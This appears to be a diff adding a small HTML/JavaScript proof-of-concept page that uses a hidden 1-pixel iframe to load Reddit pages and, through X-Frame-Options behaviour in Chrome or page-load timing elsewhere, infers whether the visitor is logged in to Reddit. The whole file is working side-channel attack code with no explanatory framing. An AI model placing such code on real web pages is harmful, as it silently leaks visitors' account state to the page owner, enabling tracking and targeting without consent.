@@ -1,0 +1,59 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252"><script src="xssSideChannel_files/jquery-1.js">
+</script>
+
+<script type="text/javascript">
+  var start = (new Date).getTime();
+  var baseUrl = "http://www.reddit.com/flandre";
+  var userUrl = "https://ssl.reddit.com/prefs/";
+  var testUrl = baseUrl;
+  var count = 0;
+  var baseAccum = 0;
+  var userAccum = 0;
+  var passedChrome = false;
+
+  $(function() { 
+    if(/chrom(e|ium)/.test(navigator.userAgent.toLowerCase())) chromeTest();
+    else performTest();
+  });
+
+  // Chrome raises an error and stops the thread if X-Frame-Options are Deny
+  function chromeTest() {
+    setTimeout("checkReturned()", 5000);
+    $('#frame').attr('src', userUrl + '?' + start);
+    document.getElementById('frame').onload= function() {
+      passedChrome = true;
+    }
+  }
+
+  function checkReturned() {
+    if(passedChrome) $("#msg").text("Reddit: Logged out");
+    else $("#msg").text("Reddit: Logged in");
+  }
+
+  function performTest() {
+    start = (new Date).getTime();
+    $('#frame').attr('src', testUrl + '?' + start);
+    document.getElementById('frame').onload= function() { 
+      var stop = (new Date).getTime();
+      var delta = stop - start;
+
+      if(count > 0 && count < 10) {
+        baseAccum += delta;
+      } else if (count > 11) {
+        userAccum += delta;
+      }
+      count ++;
+      if(count == 10) testUrl = userUrl;
+      if(count <= 20) setTimeout("performTest()", 250);
+      else if (userAccum < baseAccum) $("#msg").text("Reddit: Logged in");
+      else $("#msg").text("Reddit: Logged out");
+    }
+  }
+
+</script>
+
+
+</head><body><h3 id="msg">Reddit: Logged in</h3>
+<iframe src="xssSideChannel_files/a.htm" id="frame" style="margin-left: -20px" height="1px" width="1px">
+</iframe></body></html>
